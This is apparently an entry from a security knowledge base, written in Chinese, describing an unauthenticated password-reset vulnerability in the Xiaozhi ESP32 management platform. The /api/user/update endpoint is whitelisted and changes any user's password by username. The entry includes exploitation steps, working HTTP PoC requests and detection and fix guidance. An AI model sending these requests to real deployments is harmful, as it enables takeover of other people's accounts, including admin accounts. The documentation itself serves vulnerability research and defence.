---
id: web-generic-auth-xiaozhi-unauth-user-update-password-reset
title: 小智 ESP32 管理平台：/api/user/update 被白名单放行且不校验旧密码，未授权重置任意账号密码
type: scenario
domain: web
path: web/generic/auth
technique: unauth-user-update-password-reset
aliases:
- 小智 ESP32 任意密码重置
- /api/user/update 未授权
- username 条件更新密码
- 无旧密码校验
- 全站账号接管
- PUBLIC_PATHS 前缀放行写接口
tags:
- auth
- password-reset
- unauthorized
- account-takeover
- java
- spring
- xiaozhi
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:10:32+08:00'
  notes: 已对照原文与图37-42核对：@PostMapping(/update) @RequestBody Map loginRequest 取 username/password，按 username select 用户，password 非空则 encryptPassword 后 setPassword，update 的 where 按 username；实测 POST /api/user/update 无认证头将 test005 密码改为 Aa123456789 返回 200，旧密码登录 500 密码错误，新密码登录 200 返回 userId=20。卡与原文一致。未验证点：未对 admin 实测；frontmatter 无 sources/source_url。
---

## 一句话结论

小智 ESP32 管理平台的 `POST /api/user/update` 位于被 `PUBLIC_PATHS` 前缀 `/api/user/` 放行的路径下，未登录即可调用；控制器从 JSON `loginRequest` 取 `username` 与 `password`，`userService.update` 按 `username` 条件更新且不校验旧密码，攻击者只需知道用户名就能把任意账号（含 admin）密码改成自己指定的值，随后登录接管。

## 原理

- 鉴权缺陷：`AuthenticationInterceptor` 的 `PUBLIC_PATHS` 含 `/api/user/`，`isPublicPath` 用 `startsWith` 匹配，`/api/user/update` 因此无需登录直接进入控制器。
- 控制器：`@PostMapping("/update") public ResultMessage update(@RequestBody Map<String,Object> loginRequest)`，从 map 中取 `username`、`email`、`tel`、`password`、`name`、`avatar`。
- 更新逻辑：若 `username` 非空，先 `selectUserByUsername(username)` 确认用户存在；若 `password` 非空，`newPassword = authenticationService.encryptPassword(password)` 后 `userQuery.setPassword(newPassword)`；随后 `userService.update(userQuery)`。
- Mapper：`<update id="update" parameterType="...SysUser"> UPDATE sys_user <set> ... password = #{password} ... </set> <where> <if test="username != null and username != ''">AND username = #{username}</if> ... </where></update>`。按 `username` 条件更新，且整个流程没有旧密码、验证码、重置 token 或管理员角色校验。
- 危害：任意已存在账号的密码可被重置；文章用 test005 验证，重置后立即用新密码登录成功（返回 admin 之外的普通用户数据），若对 admin 执行同样请求即可接管管理员。
- 前置：需要知道目标用户名，可通过同一白名单下的 `/api/user/queryUsers` 未授权枚举（见关联卡）。

## 触发条件

- 目标为小智 ESP32 Server Java 管理平台，`/api/user/` 前缀被拦截器放行。
- `/api/user/update` 可达且 `userService.update` 按 username 更新。
- 攻击者知道一个已存在用户名（admin 或枚举所得）。
- 密码字段无额外强度/审批限制（文章密码 `Aa123456789` 满足强度要求）。

## 利用步骤

1. 用 `/api/user/queryUsers` 或 `/api/user/query?username=admin` 枚举目标用户名。
2. 不带任何 Cookie/Token，向 `/api/user/update` 发送 JSON，设置 `username` 为目标、`password`/`password2` 为新密码。
3. 响应 200「操作成功」表示已更新。
4. 用目标用户名与新密码调用 `/api/user/login`，返回 200 与用户数据/会话，接管账号。
5. 若目标是 admin，登录后获得后台管理权限；可进一步利用文件上传等接口。

## PoC

```http
POST /api/user/update HTTP/1.1
Host: target.example:10808
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
Content-Length: 73

{"username":"test005","password":"Aa123456789","password2":"Aa123456789"}
```

```text
# 预期：HTTP/1.1 200 {"code":200,"message":"操作成功"}
# 无需任何 Cookie/Token（文章截图请求未带认证头）。
```

```http
POST /api/user/login HTTP/1.1
Host: target.example:10808
Content-Type: application/json;charset=UTF-8

{"username":"test005","password":"Aa123456789","rememberMe":true}
```

```text
# 预期：HTTP/1.1 200，返回该用户数据（userId=20、username=test005 等），
# 证明新密码生效、账号被接管。
```

## 变体与关联

- 变体：`email`、`tel` 也可作为更新条件，若知道邮箱/手机号可绕过 username 枚举。
- 变体：`update` 的 Mapper 中 `roleId = ${roleId}` 使用字符串插值，若其他调用方把 roleId 传入可能存在 SQL 注入/角色篡改面（文章未验证）。
- 关联：[[web-generic-auth-xiaozhi-public-paths-user-prefix-unauth-data-exposure]]（未授权枚举用户名）；[[web-generic-auth-smartermail-force-reset-password-anonymous-admin]]（匿名密码重置的同类模式）；[[web-generic-auth-password-reset-username-tampering]]（按 username 篡改重置目标）；[[web-generic-auth-authenticated-change-password-idor]]（改密接口越权）。
- 边界：文章用自己创建的 test005 验证了重置与登录，未对 admin 实测；但代码对任意 username 一视同仁，接管 admin 只取决于用户名是否存在。

## 检测与防御

- 检测：审计白名单前缀下是否存在写接口；监控未登录对 `/api/user/update` 的 POST；关注短时间内同一 IP 对多个 username 的改密请求与随后的登录行为。
- 修复：白名单改为精确登录/注册路由，`/api/user/update` 强制认证；改密必须校验旧密码或一次性重置 token，并校验操作者与目标用户的关系；管理员重置他人密码需管理员角色与审计。
- 加固：密码重置流程加入验证码/邮件或短信确认；对敏感写接口做 CSRF 防护；记录改密操作者、目标、来源 IP 与时间。
